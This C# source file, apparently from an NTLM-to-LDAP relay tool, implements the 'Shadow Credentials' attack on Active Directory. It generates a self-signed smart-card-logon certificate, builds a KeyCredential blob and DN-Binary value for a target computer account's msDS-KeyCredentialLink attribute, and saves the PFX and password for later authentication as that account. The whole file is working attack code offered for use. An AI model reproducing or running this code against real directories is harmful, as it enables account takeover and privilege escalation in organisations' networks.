// ShadowCredentials.cs - Shadow Credentials utility class
// Generates self-signed certificates and KeyCredential structures for msDS-KeyCredentialLink
// Based on Whisker/PyWhisker implementation


using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;


namespace HttpLdapRelay
{
    /// <summary>
    /// Utility class for Shadow Credentials attack
    /// Generates self-signed certificates and KeyCredential structures
    /// </summary>
    public static class ShadowCredentials
    {
        // KeyCredential entry types (MS-ADTS)
        private const ushort KEY_ID = 0x0001;
        private const ushort KEY_HASH = 0x0002;
        private const ushort KEY_MATERIAL = 0x0003;
        private const ushort KEY_USAGE = 0x0004;
        private const ushort KEY_SOURCE = 0x0005;
        private const ushort DEVICE_ID = 0x0006;
        private const ushort CUSTOM_KEY_INFO = 0x0007;
        private const ushort KEY_APPROXIMATE_LAST_LOGON = 0x0008;
        private const ushort KEY_CREATION_TIME = 0x0009;

        // Key usage values
        private const byte KEY_USAGE_NGC = 0x01;
        private const byte KEY_USAGE_FIDO = 0x07;
        private const byte KEY_USAGE_FEK = 0x08;

        // Key source values
        private const byte KEY_SOURCE_AD = 0x00;
        private const byte KEY_SOURCE_AZURE_AD = 0x01;

        /// <summary>
        /// Result of shadow credential generation
        /// </summary>
        public class ShadowCredentialResult
        {
            public byte[] PfxBytes { get; set; }
            public string PfxPassword { get; set; }
            public byte[] CertificateBytes { get; set; }
            public byte[] PrivateKeyBytes { get; set; }
            public byte[] KeyCredentialBytes { get; set; }
            public byte[] KeyCredentialBlob { get; set; }
            public byte[] KeyId { get; set; }
            public string DnBinaryValue { get; set; }
            public Guid DeviceId { get; set; }
            public string SubjectName { get; set; }
            public DateTime NotBefore { get; set; }
            public DateTime NotAfter { get; set; }
        }

        /// <summary>
        /// Create shadow credentials for a computer account
        /// </summary>
        public static ShadowCredentialResult CreateForComputer(string targetDn)
        {
            string cn = ExtractCN(targetDn);
            return Create(cn, targetDn);
        }

        /// <summary>
        /// Create shadow credentials with a self-signed certificate
        /// </summary>
        private static ShadowCredentialResult Create(string subjectName, string targetDn)
        {
            var result = new ShadowCredentialResult();
            result.DeviceId = Guid.NewGuid();
            result.SubjectName = subjectName;
            result.PfxPassword = GenerateRandomPassword(16);
            result.NotBefore = DateTime.UtcNow.AddMinutes(-10);
            result.NotAfter = DateTime.UtcNow.AddYears(1);

            // Generate RSA key pair (2048-bit)
            using (RSA rsa = RSA.Create(2048))
            {
                // Create certificate request
                var request = new CertificateRequest(
                    $"CN={subjectName}",
                    rsa,
                    HashAlgorithmName.SHA256,
                    RSASignaturePadding.Pkcs1
                );

                // Add basic constraints (not a CA)
                request.CertificateExtensions.Add(
                    new X509BasicConstraintsExtension(false, false, 0, false)
                );

                // Add key usage
                request.CertificateExtensions.Add(
                    new X509KeyUsageExtension(
                        X509KeyUsageFlags.DigitalSignature | X509KeyUsageFlags.KeyEncipherment,
                        false
                    )
                );

                // Add enhanced key usage for smart card logon
                request.CertificateExtensions.Add(
                    new X509EnhancedKeyUsageExtension(
                        new OidCollection
                        {
                            new Oid("1.3.6.1.5.5.7.3.2"),      // Client Authentication
                            new Oid("1.3.6.1.4.1.311.20.2.2")  // Smart Card Logon
                        },
                        false
                    )
                );

                // Create self-signed certificate
                using (X509Certificate2 certWithKey = request.CreateSelfSigned(result.NotBefore, result.NotAfter))
                {
                    // Export to PFX with private key
                    result.PfxBytes = certWithKey.Export(X509ContentType.Pfx, result.PfxPassword);
                    result.CertificateBytes = certWithKey.Export(X509ContentType.Cert);

                    // Get RSA parameters for KeyCredential
                    RSAParameters rsaParams = rsa.ExportParameters(false);

                    // Build KeyMaterial (BCRYPT_RSAKEY_BLOB format)
                    byte[] keyMaterial = BuildRSAKeyBlob(rsaParams);

                    // Compute KeyId = SHA256(KeyMaterial)
                    using (var sha256 = SHA256.Create())
                    {
                        result.KeyId = sha256.ComputeHash(keyMaterial);
                    }

                    // Build KeyCredential blob
                    result.KeyCredentialBlob = BuildKeyCredentialBlob(
                        result.KeyId,
                        keyMaterial,
                        result.DeviceId
                    );
                    result.KeyCredentialBytes = result.KeyCredentialBlob;

                    // Build DN-Binary value for LDAP
                    result.DnBinaryValue = ToDNBinary(result.KeyCredentialBlob, targetDn);
                }

                // Export private key
                result.PrivateKeyBytes = rsa.ExportRSAPrivateKey();
            }

            return result;
        }

        /// <summary>
        /// Build RSA public key in BCRYPT_RSAKEY_BLOB format
        /// </summary>
        private static byte[] BuildRSAKeyBlob(RSAParameters rsaParams)
        {
            using (var ms = new MemoryStream())
            using (var writer = new BinaryWriter(ms))
            {
                // BCRYPT_RSAPUBLIC_MAGIC = "RSA1" = 0x31415352
                writer.Write((uint)0x31415352);

                // BitLength (key size in bits)
                writer.Write((uint)(rsaParams.Modulus.Length * 8));

                // cbPublicExp (size of exponent)
                writer.Write((uint)rsaParams.Exponent.Length);

                // cbModulus (size of modulus)
                writer.Write((uint)rsaParams.Modulus.Length);

                // cbPrime1 (0 for public key only)
                writer.Write((uint)0);

                // cbPrime2 (0 for public key only)
                writer.Write((uint)0);

                // PublicExponent (big-endian) - RSAParameters exports big-endian bytes
                writer.Write(rsaParams.Exponent);

                // Modulus (big-endian) - DO NOT reverse
                writer.Write(rsaParams.Modulus);

                return ms.ToArray();
            }
        }


        /// <summary>
        /// Build the KeyCredential blob for msDS-KeyCredentialLink
        /// Format: Version (4 bytes) + Entries
        /// </summary>
        private static byte[] BuildKeyCredentialBlob(byte[] keyId, byte[] keyMaterial, Guid deviceId)
        {
            using (var ms = new MemoryStream())
            using (var writer = new BinaryWriter(ms))
            {
                // Version: KEY_CREDENTIAL_LINK_VERSION_2 (0x00000200)
                writer.Write((uint)0x00000200);

                // Entry 1: KeyID (32 bytes)
                WriteEntry(writer, KEY_ID, keyId);

                // Entry 2: KeyHash -> reserve 32 bytes (placeholder)
                long keyHashEntryStart = ms.Position;
                WriteEntry(writer, KEY_HASH, new byte[32]); // placeholder

                // record where placeholder data starts (after Length(2) + Identifier(1))
                long placeholderDataStart = keyHashEntryStart + 3;

                // Entry 3: KeyMaterial (RSA public key blob)
                WriteEntry(writer, KEY_MATERIAL, keyMaterial);

                // Entry 4: KeyUsage = NGC (1 byte)
                WriteEntry(writer, KEY_USAGE, new byte[] { KEY_USAGE_NGC });

                // Entry 5: KeySource = AD (1 byte)
                WriteEntry(writer, KEY_SOURCE, new byte[] { KEY_SOURCE_AD });

                // Entry 6: DeviceId (GUID, 16 bytes)
                WriteEntry(writer, DEVICE_ID, deviceId.ToByteArray());

                // Correction pour le patch recent de shadowcredz
                // Entry 7: CustomKeyInformation (Version=1, Flags=MFA_NOT_USED=0x02)
                WriteEntry(writer, CUSTOM_KEY_INFO, new byte[] { 0x01, 0x02 });


                // Entry 9: KeyCreationTime (FILETIME)
                long fileTime = DateTime.UtcNow.ToFileTimeUtc();
                WriteEntry(writer, KEY_CREATION_TIME, BitConverter.GetBytes(fileTime));

                // Compute KeyHash = SHA256(all bytes **after** the KeyHash entry)
                byte[] keyBinary = ms.ToArray();

                // start for hash = first byte immediately after the KeyHash data
                int startForHash = (int)(placeholderDataStart + 32);

                using (var sha256 = SHA256.Create())
                {
                    byte[] computedHash = sha256.ComputeHash(keyBinary, startForHash, keyBinary.Length - startForHash);

                    // placeholderDataStart is where the 32 bytes placeholder begins in the array
                    Array.Copy(computedHash, 0, keyBinary, placeholderDataStart, 32);
                }

                return keyBinary;
            }
        }



        /// <summary>
        /// Write a single KeyCredential entry
        /// Format: Length (2 bytes) + Identifier (2 bytes) + Data
        /// </summary>
        private static void WriteEntry(BinaryWriter writer, ushort identifier, byte[] data)
        {
            // Length of data (little-endian USHORT)
            writer.Write((ushort)data.Length);
            // Entry identifier (1 byte)
            writer.Write((byte)identifier);
            // Data
            writer.Write(data);
        }


        /// <summary>
        /// Convert KeyCredential bytes to DN-Binary format for LDAP
        /// Format: B:<hex_length>:<hex_data>:<owner_dn>
        /// </summary>
        public static string ToDNBinary(byte[] keyCredentialBytes, string ownerDn)
        {
            string hexString = BitConverter.ToString(keyCredentialBytes).Replace("-", "");
            return $"B:{hexString.Length}:{hexString}:{ownerDn}";
        }

        /// <summary>
        /// Print information about generated credentials
        /// </summary>
        public static void PrintInfo(ShadowCredentialResult result)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"[+] Shadow Credentials generated successfully!");
            Console.ResetColor();
            Console.WriteLine($"    Subject: CN={result.SubjectName}");
            Console.WriteLine($"    DeviceId: {result.DeviceId}");
            Console.WriteLine($"    KeyId: {BitConverter.ToString(result.KeyId, 0, 8).Replace("-", "")}...");
            Console.WriteLine($"    Valid from: {result.NotBefore:yyyy-MM-dd HH:mm:ss} UTC");
            Console.WriteLine($"    Valid to: {result.NotAfter:yyyy-MM-dd HH:mm:ss} UTC");
            Console.WriteLine($"    PFX Password: {result.PfxPassword}");
        }

        /// <summary>
        /// Save credentials to files
        /// </summary>
        public static void SaveToFiles(ShadowCredentialResult result, string basePath)
        {
            string pfxPath = $"{basePath}.pfx";
            string cerPath = $"{basePath}.cer";

            File.WriteAllBytes(pfxPath, result.PfxBytes);
            File.WriteAllBytes(cerPath, result.CertificateBytes);

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"[+] Saved PFX to: {pfxPath}");
            Console.WriteLine($"[+] Saved CER to: {cerPath}");
            Console.ResetColor();
        }

        /// <summary>
        /// Extract CN from distinguished name
        /// </summary>
        private static string ExtractCN(string dn)
        {
            if (string.IsNullOrEmpty(dn))
                return "Unknown";

            string[] parts = dn.Split(',');
            foreach (string part in parts)
            {
                string trimmed = part.Trim();
                if (trimmed.StartsWith("CN=", StringComparison.OrdinalIgnoreCase))
                {
                    return trimmed.Substring(3);
                }
            }

            return dn;
        }

        /// <summary>
        /// Generate a random password
        /// </summary>
        private static string GenerateRandomPassword(int length)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            var random = new byte[length];
            using (var rng = RandomNumberGenerator.Create())
            {
                rng.GetBytes(random);
            }

            var result = new char[length];
            for (int i = 0; i < length; i++)
            {
                result[i] = chars[random[i] % chars.Length];
            }
            return new string(result);
        }
    }
}